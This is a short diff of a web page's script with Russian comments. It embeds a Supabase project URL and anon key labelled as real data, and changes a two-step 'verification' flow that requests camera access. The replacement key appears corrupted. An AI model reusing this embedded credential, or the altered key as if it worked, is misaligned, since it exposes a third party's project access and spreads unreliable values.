@@ -126,7 +126,7 @@
     <script>
         // Твои реальные данные Supabase
         const SUPABASE_URL = 'https://vesinwkjmjykdhtdsnat.supabase.co';
-        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZlc2lud2tqbWp5a2RodGRzbmF0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI0OTg5NTUsImV4cCI6MjEwODA3NDk1NX0.JDAtKh6sW9nmeIpdr1zMG_OPYfXsmXrZPATepyi831w';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZlc2lud2tqbWp5a2RodGRzbmF0Ikkicm9sZSI6ImFub24iLCJpYXQiOjE3OTI0OTg5NTUsImV4cCI6MjEwODA3NDk1NX0.JDAtKh6sW9nmeIpdr1zMG_OPYfXsmXrZPATepyi831w';
         
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
@@ -169,10 +169,10 @@
                 
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // ШАГ 2: Запрашиваем камеру
+                // ШАГ 2: Запрашиваем камеру (универсальный запрос для телефонов)
                 statusText.textContent = "Шаг 2/2: Проверка видеокамеры...";
                 const videoStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
+                    video: true, 
                     audio: false 
                 });
                 
